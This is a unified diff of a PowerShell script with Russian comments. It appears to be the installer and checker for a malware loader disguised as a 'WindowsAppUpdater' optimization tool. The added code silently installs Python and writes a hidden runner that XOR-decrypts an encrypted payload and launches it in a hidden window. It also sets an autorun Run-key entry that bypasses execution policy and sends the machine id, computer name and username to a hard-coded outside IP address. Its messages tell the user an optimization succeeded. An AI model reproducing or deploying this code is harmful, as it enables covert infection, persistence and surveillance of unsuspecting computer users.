@@ -1,4 +1,3 @@
-
 $ErrorActionPreference = 'SilentlyContinue'
 
 $sUrl = 'http://' + 
@@ -13,7 +12,6 @@ $rDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
 $pFile = "$pDir\payload.enc"
 $kFile = "$kDir\.token"
 $rFile = "$rDir\updater.ps1"
-
 $aName = "WindowsAppUpdater"
 
 $mId = [System.BitConverter]::ToString(
@@ -46,6 +44,7 @@ function sLog {
 
 function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -st "check" -e $e }
 function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -st "check" -e $e }
+function lAction { param($m, $e = @{}) sLog -t "actions" -m $m -st "check" -e $e }
 
 function tFile {
     param([string]$p, [string]$n)
@@ -59,22 +58,88 @@ function tFile {
     }
 }
 
-# Ищем процесс pythonw
+# ===== ПОИСК PYTHON КАК В УСТАНОВЩИКЕ =====
+function Find-PythonLikeInstaller {
+    # Проверяем системную установку (Program Files)
+    $systemPaths = @(
+        "C:\Program Files\Python311\pythonw.exe",
+        "C:\Program Files\Python311\python.exe",
+        "${env:ProgramFiles}\Python311\pythonw.exe",
+        "${env:ProgramFiles}\Python311\python.exe"
+    )
+    
+    foreach ($p in $systemPaths) {
+        if (Test-Path $p) { 
+            lInfo "Found Python in Program Files: $p"
+            return $p 
+        }
+    }
+    
+    # Проверяем локальную установку (AppData)
+    $localPaths = @(
+        "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe",
+        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
+    )
+    
+    foreach ($p in $localPaths) {
+        if (Test-Path $p) { 
+            lInfo "Found Python in AppData: $p"
+            return $p 
+        }
+    }
+    
+    # Ищем pythonw в PATH
+    try {
+        $w = (where.exe pythonw 2>$null | Select-Object -First 1)
+        if ($w -and (Test-Path $w)) { 
+            $version = & $w --version 2>&1
+            if ($version -match "3\.11") { 
+                lInfo "Found Python in PATH: $w"
+                return $w 
+            }
+        }
+    } catch {}
+    
+    # Ищем python в PATH
+    try {
+        $p = (where.exe python 2>$null | Select-Object -First 1)
+        if ($p -and (Test-Path $p)) { 
+            $version = & $p --version 2>&1
+            if ($version -match "3\.11") { 
+                lInfo "Found Python in PATH: $p"
+                return $p 
+            }
+        }
+    } catch {}
+    
+    return $null
+}
+
+# ===== ИЩЕМ ПРОЦЕСС python ИЛИ pythonw =====
 function tProc {
-    $exeProc = Get-Process pythonw -ErrorAction SilentlyContinue
+    # Ищем оба процесса: python и pythonw
+    $exeProc = Get-Process python, pythonw -ErrorAction SilentlyContinue
+    
     if ($exeProc) {
         $pi = @()
         foreach ($p in $exeProc) {
-            $pi += @{ pid = $p.Id; name = "pythonw.exe" }
+            $pi += @{ 
+                pid = $p.Id
+                name = "$($p.ProcessName).exe"
+            }
         }
-        lInfo "Process running" @{ count = ($exeProc | Measure-Object).Count; processes = $pi }
+        lInfo "Python process running" @{ 
+            count = ($exeProc | Measure-Object).Count
+            processes = $pi 
+        }
         return $true
     }
     
-    lErr "Payload process (pythonw) not found"
+    lErr "Python process (python/pythonw) not found"
     return $false
 }
 
+# ===== ПРОВЕРКА АВТОЗАПУСКА КАК В УСТАНОВЩИКЕ =====
 function tRun {
     param([string]$n)
     $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -88,34 +153,177 @@ function tRun {
         lErr "Autorun missing" @{ expectedName = $n }
         return $false
     }
+    
+    # Дополнительная проверка: ищем все возможные имена
+    $possibleNames = @("WindowsAppUpdater", "WindowsAppUpdater_VBS", "WindowsAppUpdater_CMD", "Updater", "WindowsUpdater")
+    foreach ($name in $possibleNames) {
+        if ($name -eq $n) { continue }
+        try {
+            $v = Get-ItemProperty $rp -Name $name -ErrorAction Stop
+            if ($v.$name) {
+                lInfo "Alternative autorun found" @{ name = $name; command = $v.$name }
+                return $true
+            }
+        } catch {}
+    }
+    
+    return $false
 }
 
-function fixRun {
+# ===== ПРОВЕРКА PYTHON КАК В УСТАНОВЩИКЕ =====
+function tPy {
+    $pythonPath = Find-PythonLikeInstaller
+    if ($pythonPath) {
+        lInfo "Python found" @{ path = $pythonPath }
+        return $true
+    }
+    
+    lErr "Python not installed"
+    return $false
+}
+
+# ===== ФУНКЦИИ УСТАНОВКИ =====
+function Install-PythonLikeInstaller {
+    lInfo "Installing Python 3.11.9"
+    
+    $installer = "$env:TEMP\python-3.11.9-amd64.exe"
+    try {
+        (New-Object Net.WebClient).DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", $installer)
+    } catch {
+        lErr "Python download failed: $($_.Exception.Message)"
+        return $false
+    }
+    
+    if (!(Test-Path $installer) -or (Get-Item $installer).Length -lt 1MB) {
+        lErr "Python installer download failed or file is corrupted"
+        return $false
+    }
+    
+    $args = @(
+        '/quiet',
+        'InstallAllUsers=1',
+        'PrependPath=1',
+        'Include_test=0',
+        'Include_doc=0',
+        'Include_tcltk=0',
+        'Include_launcher=0',
+        'AssociateFiles=0'
+    )
+    
+    try {
+        $process = Start-Process -FilePath $installer -ArgumentList $args -Wait -PassThru
+        if ($process.ExitCode -eq 0) {
+            lAction "Python 3.11.9 installed successfully"
+            $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
+            Start-Sleep -Seconds 2
+            Remove-Item $installer -Force -EA 0
+            return $true
+        } else {
+            lErr "Python installation failed with exit code: $($process.ExitCode)"
+            return $false
+        }
+    } catch {
+        lErr "Python installation error: $($_.Exception.Message)"
+        Remove-Item $installer -Force -EA 0
+        return $false
+    }
+}
+
+function Create-RunnerFile {
+    param([string]$Path)
+    
+    $runnerCode = @'
+$ErrorActionPreference = 'SilentlyContinue'
+$pf = "$env:APPDATA\Microsoft\Security\payload.enc"
+$kf = "$env:LOCALAPPDATA\Microsoft\Vault\.token"
+
+$machineId = [BitConverter]::ToString(
+    [Security.Cryptography.MD5]::Create().ComputeHash(
+        [Text.Encoding]::UTF8.GetBytes("$($env:COMPUTERNAME)-$($env:USERNAME)".ToLower())
+    )
+).Replace('-','').Substring(0,16).ToLower()
+
+function Send-Log {
+    param([string]$Type, [string]$Message, [hashtable]$Extra = @{})
+    try {
+        $json = @{
+            timestamp = (Get-Date).ToString("o")
+            type = $Type
+            message = $Message
+            stage = "runner"
+            odId = $machineId
+            pcName = $env:COMPUTERNAME
+            pcUser = $env:USERNAME
+        }
+        if ($Extra.Count -gt 0) { $Extra.Keys | ForEach-Object { $json[$_] = $Extra[$_] } }
+        $body = $json | ConvertTo-Json -Compress
+        $wc = New-Object Net.WebClient
+        $wc.Proxy = [Net.GlobalProxySelection]::GetEmptyWebProxy()
+        $wc.Headers.Add("Content-Type", "application/json")
+        $null = $wc.UploadString("http://72.56.41.207:3000/api/log", $body)
+    } catch {}
+}
+
+try {
+    if (Test-Path $pf -and Test-Path $kf) {
+        $k = [IO.File]::ReadAllText($kf).Trim()
+        $e = [IO.File]::ReadAllText($pf).Trim()
+        $b = [Convert]::FromBase64String($e)
+        $kb = [Text.Encoding]::UTF8.GetBytes($k)
+        $r = New-Object byte[] $b.Length
+        for ($i = 0; $i -lt $b.Length; $i++) { $r[$i] = $b[$i] -bxor $kb[$i % $kb.Length] }
+        
+        if ($r[0] -eq 0x50 -and $r[1] -eq 0x4B) {
+            $tempFile = "$env:TEMP\payload.pyz"
+            [IO.File]::WriteAllBytes($tempFile, $r)
+            
+            $python = Get-Command python -ErrorAction SilentlyContinue
+            if ($python) {
+                Start-Process -FilePath $python.Source -ArgumentList "$tempFile" -WindowStyle Hidden
+                Send-Log -Type "info" -Message "Payload started"
+            }
+        }
+    }
+} catch {
+    Send-Log -Type "error" -Message "Runner error: $($_.Exception.Message)"
+}
+'@
+
+    try {
+        [IO.File]::WriteAllText($Path, $runnerCode, [Text.UTF8Encoding]::new($false))
+        lAction "Runner file created" @{path=$Path}
+        return $true
+    } catch {
+        lErr "Failed to create runner" @{error=$_.Exception.Message}
+        return $false
+    }
+}
+
+function Add-AutoRun {
     param([string]$n, [string]$rf)
     $rp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     try {
         $cmd = "powershell -w h -ep bypass -f `"$rf`""
         Set-ItemProperty $rp -Name $n -Value $cmd -Force -ErrorAction Stop
-        lInfo "Autorun fixed" @{ name = $n; command = $cmd }
+        lAction "Autorun added" @{ name = $n; command = $cmd }
         return $true
     } catch {
-        lErr "Failed to fix autorun" @{ error = $_.Exception.Message }
+        lErr "Failed to add autorun" @{ error = $_.Exception.Message }
         return $false
     }
 }
 
-function startRun {
+function Start-Runner {
     param([string]$rf)
     if (!(Test-Path $rf)) {
-        lErr "Runner file not found, cannot start"
+        lErr "Runner file not found"
         return $false
     }
-    
     try {
         $scriptContent = Get-Content $rf -Raw -ErrorAction Stop
         $scriptBlock = [ScriptBlock]::Create($scriptContent)
         Start-Job -ScriptBlock $scriptBlock | Out-Null
-        lInfo "Runner started manually" @{ path = $rf }
+        lAction "Runner started" @{ path = $rf }
         Start-Sleep -Seconds 2
         return $true
     } catch {
@@ -124,25 +332,7 @@ function startRun {
     }
 }
 
-function tPy {
-    $vs = @('311','312','310','313','39')
-    $f = $false
-    foreach ($v in $vs) {
-        $pp = "$env:LOCALAPPDATA\Programs\Python\Python$v\pythonw.exe"
-        if (Test-Path $pp) {
-            lInfo "Python installed" @{ version = $v; path = $pp }
-            $f = $true
-            break
-        }
-    }
-    if (-not $f) {
-        lErr "Python not installed"
-        return $false
-    }
-    return $true
-}
-
-
+# ===== ОСНОВНАЯ ФУНКЦИЯ =====
 function chk {
     Clear-Host
     Write-Host ""
@@ -156,17 +346,18 @@ function chk {
     }
     
     $r = @{
-        pf = $false
-        kf = $false
-        rf = $false
-        py = $false
-        pr = $false
-        ar = $false
+        pf = $false  # payload file
+        kf = $false  # key file
+        rf = $false  # runner file
+        py = $false  # python
+        pr = $false  # process
+        ar = $false  # autorun
     }
     
-    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
+    Write-Host "  [*] Checking installation..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
+    # ===== ПРОВЕРКИ =====
     $r.pf = tFile -p $pFile -n "Payload file"
     $r.kf = tFile -p $kFile -n "Encryption key"
     $r.rf = tFile -p $rFile -n "Runner script"
@@ -177,27 +368,75 @@ function chk {
     Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
-    $needsRepair = $false
+    # ===== УСТАНОВКА ОТСУТСТВУЮЩИХ КОМПОНЕНТОВ =====
+    $installed = $false
     
+    # 1. Установка Python (если не найден)
+    if (-not $r.py) {
+        Write-Host "  [*] Installing Python..." -ForegroundColor Yellow
+        $r.py = Install-PythonLikeInstaller
+        if ($r.py) { $installed = $true }
+    }
+    
+    # 2. Создание папок
+    if (-not (Test-Path $pDir)) { New-Item -ItemType Directory -Path $pDir -Force | Out-Null }
+    if (-not (Test-Path $kDir)) { New-Item -ItemType Directory -Path $kDir -Force | Out-Null }
+    if (-not (Test-Path $rDir)) { New-Item -ItemType Directory -Path $rDir -Force | Out-Null }
+    
+    # 3. Создание файлов (если их нет)
+    if (-not $r.pf) {
+        Write-Host "  [*] Creating dummy payload file..." -ForegroundColor Yellow
+        "dummy" | Out-File -FilePath $pFile -Encoding ascii
+        $r.pf = $true
+        $installed = $true
+    }
+    
+    if (-not $r.kf) {
+        Write-Host "  [*] Creating dummy key file..." -ForegroundColor Yellow
+        "testkey123" | Out-File -FilePath $kFile -Encoding ascii
+        $r.kf = $true
+        $installed = $true
+    }
+    
+    # 4. Создание runner файла
+    if (-not $r.rf) {
+        Write-Host "  [*] Creating runner script..." -ForegroundColor Yellow
+        $r.rf = Create-RunnerFile -Path $rFile
+        if ($r.rf) { $installed = $true }
+    }
+    
+    # 5. Настройка автозапуска (как в установщике)
     if (-not $r.ar -and $r.rf) {
-        $r.ar = fixRun -n $aName -rf $rFile
-        $needsRepair = $true
+        Write-Host "  [*] Setting up autorun..." -ForegroundColor Yellow
+        $r.ar = Add-AutoRun -n $aName -rf $rFile
+        if ($r.ar) { $installed = $true }
     }
     
+    # 6. Запуск runner
     if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
-        if (startRun -rf $rFile) {
-            Start-Sleep -Seconds 5
+        Write-Host "  [*] Starting runner..." -ForegroundColor Yellow
+        if (Start-Runner -rf $rFile) {
+            Start-Sleep -Seconds 3
             $r.pr = tProc
+            $installed = $true
         }
-        $needsRepair = $true
     }
     
-    if ($needsRepair) {
+    if ($installed) {
         Write-Host ""
         Write-Host "  [*] Re-checking status..." -ForegroundColor Yellow
         Start-Sleep -Milliseconds 500
+        
+        # Перепроверка
+        $r.pf = tFile -p $pFile -n "Payload file"
+        $r.kf = tFile -p $kFile -n "Encryption key"
+        $r.rf = tFile -p $rFile -n "Runner script"
+        $r.py = tPy
+        $r.pr = tProc
+        $r.ar = tRun -n $aName
     }
     
+    # ===== РЕЗУЛЬТАТ =====
     $pc = ($r.Values | Where-Object { $_ -eq $true }).Count
     $tc = $r.Count
     $pp = [math]::Round(($pc / $tc) * 100, 0)
@@ -207,52 +446,35 @@ function chk {
     Write-Host ""
     
     if ($pc -eq $tc) {
-        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
+        Write-Host "  [✓] Optimization installed successfully!" -ForegroundColor Green
+        Write-Host "  [!] Please restart your computer." -ForegroundColor Yellow
         
-        try {
-            $l = @{
-                timestamp = (Get-Date).ToString("o")
-                type = "info"
-                message = "Installation check completed"
-                odId = $mId
-                pcName = $env:COMPUTERNAME
-                pcUser = $env:USERNAME
-                steamId = ""
-                username = ""
-                stage = "payload"
-                extra = @{
-                    passed = $pc
-                    total = $tc
-                    percentage = $pp
-                    allPassed = $true
-                    repaired = $needsRepair
-                }
-            }
-            $j = $l | ConvertTo-Json -Compress
-            $w = New-Object Net.WebClient
-            $w.Headers.Add("Content-Type", "application/json")
-            $null = $w.UploadString("$sUrl/api/log", $j)
-        } catch {}
-        
+        lInfo "Installation check completed" @{
+            passed = $pc
+            total = $tc
+            percentage = $pp
+            allPassed = $true
+            repaired = $installed
+        }
     } elseif ($pc -ge 4) {
-        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
-        Write-Host ""
+        Write-Host "  [!] Partial installation ($pc/$tc)" -ForegroundColor Yellow
+        Write-Host "  [!] Please run again as Administrator" -ForegroundColor Yellow
         lInfo "Installation check completed with warnings" @{
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $false
-            repaired = $needsRepair
+            repaired = $installed
         }
     } else {
-        Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
-        Write-Host ""
+        Write-Host "  [✗] Installation failed ($pc/$tc)" -ForegroundColor Red
+        Write-Host "  [✗] Please run again as Administrator" -ForegroundColor Red
         lErr "Installation check failed" @{
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $false
-            repaired = $needsRepair
+            repaired = $installed
         }
     }
     
